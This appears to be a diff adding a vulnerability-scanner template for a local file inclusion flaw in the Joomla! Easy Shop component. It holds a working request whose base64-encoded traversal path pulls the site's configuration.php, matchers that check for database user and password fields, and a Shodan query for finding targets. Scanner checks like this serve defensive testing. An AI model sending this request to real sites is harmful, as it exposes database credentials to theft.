@@ -1,0 +1,120 @@
+{
+  "id": "joomla-easyshop-lfi",
+  "name": "Joomla! Component Easy Shop 1.2.3 - Local File Inclusion",
+  "author": "ritikchaddha",
+  "severity": "HIGH",
+  "description": "The Joomla! component Easy Shop version 1.2.3 is vulnerable to Local File Inclusion (LFI) attacks.\n",
+  "references": [
+    "https://blog.csdn.net/weixin_42628854/article/details/136036109"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2023",
+    "file-upload"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.component:\"Joomla\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/index.php?option\u003dcom_easyshop\u0026task\u003dajax.loadImage\u0026file\u003dLi4vLi4vY29uZmlndXJhdGlvbi5waHA\u003d",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body, \"\u003c?php\", \"class JConfig {\")",
+            "contains_any(body, \"$user\", \"$password\", \"$dbtype\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "joomla-easyshop-lfi",
+    "info": {
+      "name": "Joomla! Component Easy Shop 1.2.3 - Local File Inclusion",
+      "author": "ritikchaddha",
+      "severity": "high",
+      "description": "The Joomla! component Easy Shop version 1.2.3 is vulnerable to Local File Inclusion (LFI) attacks.\n",
+      "reference": [
+        "https://blog.csdn.net/weixin_42628854/article/details/136036109"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.component:\"Joomla\""
+      },
+      "tags": "cnvd,cnvd2023,file-upload"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/index.php?option\u003dcom_easyshop\u0026task\u003dajax.loadImage\u0026file\u003dLi4vLi4vY29uZmlndXJhdGlvbi5waHA\u003d"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body, \"\u003c?php\", \"class JConfig {\")",
+              "contains_any(body, \"$user\", \"$password\", \"$dbtype\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
